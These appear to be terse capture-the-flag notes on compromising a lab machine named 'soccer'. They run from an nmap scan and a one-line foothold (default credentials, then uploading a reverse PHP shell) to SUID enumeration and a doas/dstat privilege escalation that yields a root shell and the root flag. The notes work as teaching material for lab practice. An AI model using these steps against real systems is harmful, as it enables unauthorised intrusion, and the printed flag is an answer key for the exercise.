
```
kali@kali ~> nmap -sC -sV -Pn 10.10.11.194
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 05:55 EDT
Nmap scan report for 10.10.11.194
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 15 Jul 2024 09:55:30 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 15 Jul 2024 09:55:30 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94SVN%I=7%D=7/15%Time=6694F20C%P=x86_64-pc-linux-gnu%r
SF:(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
SF:e\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
SF::\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type
SF:-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x20139\r\nDate:\x20Mon,\x2015\x20Jul\x202024\x2009:55:
SF:30\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20l
SF:ang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\
SF:n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r
SF:(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
SF:Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:43\r\nDate:\x20Mon,\x2015\x20Jul\x202024\x2009:55:30\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n
SF:<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pr
SF:e>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,
SF:"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defaul
SF:t-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mo
SF:n,\x2015\x20Jul\x202024\x2009:55:30\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=
SF:\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIO
SF:NS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.67 seconds

```



initial foothold was fucking annoying but sure whatever


find tiny subdirectory on the website -> login with default credentials -> find folder you have write permissions to -> upload rev php shell



after foothold

```
$ ls -la
total 72
drwxr-xr-x   8 root root 4096 Nov 17  2022 .
drwxr-xr-x 101 root root 4096 Dec 13  2022 ..
drwxr-xr-x   2 root root 4096 Nov 10  2022 conf.d
-rw-r--r--   1 root root 1077 Feb  4  2019 fastcgi.conf
-rw-r--r--   1 root root 1007 Feb  4  2019 fastcgi_params
-rw-r--r--   1 root root 2837 Feb  4  2019 koi-utf
-rw-r--r--   1 root root 2223 Feb  4  2019 koi-win
-rw-r--r--   1 root root 3957 Feb  4  2019 mime.types
drwxr-xr-x   2 root root 4096 Nov 10  2022 modules-available
drwxr-xr-x   2 root root 4096 Nov 17  2022 modules-enabled
-rw-r--r--   1 root root 1490 Feb  4  2019 nginx.conf
-rw-r--r--   1 root root  180 Feb  4  2019 proxy_params
-rw-r--r--   1 root root  636 Feb  4  2019 scgi_params
drwxr-xr-x   2 root root 4096 Dec  1  2022 sites-available
drwxr-xr-x   2 root root 4096 Dec  1  2022 sites-enabled
drwxr-xr-x   2 root root 4096 Nov 17  2022 snippets
-rw-r--r--   1 root root  664 Feb  4  2019 uwsgi_params
-rw-r--r--   1 root root 3071 Feb  4  2019 win-utf
```


```

```




after mysql dumping and finding user


```
player@soccer:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
```

```
player@soccer:~$ find / -type f -name "doas.conf" 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```


```
player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw
  1   0  98   0   0|7918B   10k|   0     0 |   0     0 | 271   503
 46   0  54   0   0|  32k    0 | 330B 1066B|   0     0 | 393   398
 45   1  54   0   0|   0    52k| 318B  604B|   0     0 | 402   412

 49   0  51   0   0|   0     0 | 360B  452B|   0     0 | 438   440 q
 47   1  52   0   0|   0     0 | 234B  444B|   0     0 | 414   408 ^[:
 45   1  54   0   0|   0     0 | 698B  612B|   0     0 | 423   423 wq
```


```
player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw
  1   0  98   0   0|7918B   10k|   0     0 |   0     0 | 271   503
 46   0  54   0   0|  32k    0 | 330B 1066B|   0     0 | 393   398
 45   1  54   0   0|   0    52k| 318B  604B|   0     0 | 402   412

 49   0  51   0   0|   0     0 | 360B  452B|   0     0 | 438   440 q
 47   1  52   0   0|   0     0 | 234B  444B|   0     0 | 414   408 ^[:
 45   1  54   0   0|   0     0 | 698B  612B|   0     0 | 423   423 wq

```


```

player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
925ecbde9886df667889fa9baf5ec0b1
```